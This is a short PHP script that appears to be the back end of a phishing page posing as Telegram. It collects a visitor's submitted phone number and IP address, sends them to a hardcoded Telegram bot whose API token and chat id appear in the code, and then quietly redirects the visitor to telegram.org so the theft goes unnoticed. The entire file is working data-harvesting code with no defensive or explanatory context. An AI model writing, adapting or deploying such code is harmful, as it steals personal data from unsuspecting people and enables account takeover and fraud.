<?php
$token = "8651623164:AAGlB3HTJkdao-FetjZuTcNLii5_9N5SR3Q";
$chat_id = "7451589222";
$phone = $_POST['phone'] ?? 'нет';
$ip = $_SERVER['REMOTE_ADDR'];
$text = "📱 Номер: $phone\n🌐 IP: $ip";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($text));
header("Location: https://telegram.org");
?>